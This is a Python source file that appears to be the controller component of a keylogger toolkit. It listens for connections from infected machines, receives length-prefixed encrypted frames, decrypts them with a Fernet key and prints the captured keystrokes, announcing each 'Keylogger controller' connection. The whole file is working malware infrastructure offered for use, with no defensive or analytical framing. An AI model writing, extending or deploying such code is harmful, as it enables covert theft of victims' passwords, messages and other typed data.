import socket
import struct

from cryptography.fernet import Fernet
from mainclass.encrypter import system
from colorama import Fore, init, Style
import threading

init(autoreset=True)

def _get_fernet():
    key = system.getdata("KEY")
    if not key:
        return None
    if isinstance(key, str):
        key = key.encode()
    try:
        return Fernet(key)
    except Exception:
        return None


def _recv_frame(conn):
    size_data = conn.recv(4)
    if not size_data or len(size_data) < 4:
        return None
    size = size = struct.unpack('>I', size_data)[0]
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data if data else None

def _recv_and_save(conn, stop_event):
    fernet = _get_fernet()
    try:
        while not (stop_event and stop_event.is_set()):
            data = _recv_frame(conn)
            if data is None:
                break
            if fernet:
                try:
                    text = fernet.decrypt(data).decode("utf-8", errors="replace")
                except Exception:
                    text = repr(data)
            else:
                text = data.decode("utf-8", errors="replace")
            print(text, end="", flush=True)
        print(f"{Fore.LIGHTGREEN_EX}[+] Keylogger controller disconnected")
    except Exception as error:
        print(f"{Fore.LIGHTRED_EX}[-] Keylogger controller error: {error}")
def handle_connection(conn, addr, stop_event=None):
    print(f"{Fore.LIGHTGREEN_EX}[+] Keylogger controller connected from {Fore.LIGHTCYAN_EX}{addr}")
    _recv_and_save(conn, stop_event)